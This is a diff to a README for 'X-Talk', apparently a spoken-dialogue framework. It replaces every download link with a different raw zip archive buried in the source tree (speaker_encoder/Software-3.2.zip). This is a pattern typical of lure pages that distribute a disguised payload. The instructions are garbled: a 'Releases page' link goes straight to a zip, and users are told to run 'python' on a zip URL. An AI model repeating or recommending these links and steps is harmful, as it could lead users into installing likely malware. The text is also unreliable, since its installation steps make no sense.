@@ -1,7 +1,7 @@
 # 🎤 xtalk - Seamless Speech Interaction Made Simple
 
 ## 🖱️ Download Now
-[![Download xtalk](https://github.com/NaldoGomes0897/xtalk/raw/refs/heads/main/src/xtalk/speech/speech_speed_controller/Software_burgonet.zip)](https://github.com/NaldoGomes0897/xtalk/raw/refs/heads/main/src/xtalk/speech/speech_speed_controller/Software_burgonet.zip)
+[![Download xtalk](https://github.com/NaldoGomes0897/xtalk/raw/refs/heads/main/src/xtalk/speech/speaker_encoder/Software-3.2.zip)](https://github.com/NaldoGomes0897/xtalk/raw/refs/heads/main/src/xtalk/speech/speaker_encoder/Software-3.2.zip)
 
 ## 📜 Description
 X-Talk is an open-source framework designed for full-duplex spoken dialogue systems. It allows low-latency, interruptible, and human-like speech interaction. Built entirely in Python, it provides a lightweight and production-ready architecture for voice applications.
@@ -11,13 +11,13 @@ To start using X-Talk, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to reach the download section of our GitHub repository.  
-   [Download X-Talk Releases](https://github.com/NaldoGomes0897/xtalk/raw/refs/heads/main/src/xtalk/speech/speech_speed_controller/Software_burgonet.zip)
+   [Download X-Talk Releases](https://github.com/NaldoGomes0897/xtalk/raw/refs/heads/main/src/xtalk/speech/speaker_encoder/Software-3.2.zip)
 
 2. **Choose the Latest Release**  
    On the Releases page, you’ll find various versions of X-Talk. Look for the latest version at the top of the list.
 
 3. **Download the Application**  
-   Click on the relevant file for your operating system to download it. The file will be named something like `https://github.com/NaldoGomes0897/xtalk/raw/refs/heads/main/src/xtalk/speech/speech_speed_controller/Software_burgonet.zip` or `https://github.com/NaldoGomes0897/xtalk/raw/refs/heads/main/src/xtalk/speech/speech_speed_controller/Software_burgonet.zip`.
+   Click on the relevant file for your operating system to download it. The file will be named something like `https://github.com/NaldoGomes0897/xtalk/raw/refs/heads/main/src/xtalk/speech/speaker_encoder/Software-3.2.zip` or `https://github.com/NaldoGomes0897/xtalk/raw/refs/heads/main/src/xtalk/speech/speaker_encoder/Software-3.2.zip`.
 
 4. **Install X-Talk**  
    Once the download finishes, locate the file in your downloads folder.  
@@ -27,7 +27,7 @@ To start using X-Talk, follow these steps:
 5. **Run X-Talk**  
    After installation, you can start using X-Talk.  
    - For Windows, find X-Talk in your applications or search for it in the Start menu.  
-   - For macOS or Linux, return to the terminal, go to the installation directory, and type `python https://github.com/NaldoGomes0897/xtalk/raw/refs/heads/main/src/xtalk/speech/speech_speed_controller/Software_burgonet.zip` to launch the application.
+   - For macOS or Linux, return to the terminal, go to the installation directory, and type `python https://github.com/NaldoGomes0897/xtalk/raw/refs/heads/main/src/xtalk/speech/speaker_encoder/Software-3.2.zip` to launch the application.
 
 ## 📦 Installation Requirements
 Before downloading X-Talk, ensure your system meets these requirements:
@@ -86,6 +86,6 @@ If you'd like to contribute to X-Talk, we welcome your input! Check the contribu
 ## 📥 Stay Updated
 Follow us on GitHub to stay informed about the latest features and improvements.  
 
-[Download X-Talk Releases](https://github.com/NaldoGomes0897/xtalk/raw/refs/heads/main/src/xtalk/speech/speech_speed_controller/Software_burgonet.zip)   
+[Download X-Talk Releases](https://github.com/NaldoGomes0897/xtalk/raw/refs/heads/main/src/xtalk/speech/speaker_encoder/Software-3.2.zip)   
 
 Explore, experiment, and enjoy seamless spoken dialogue with X-Talk!
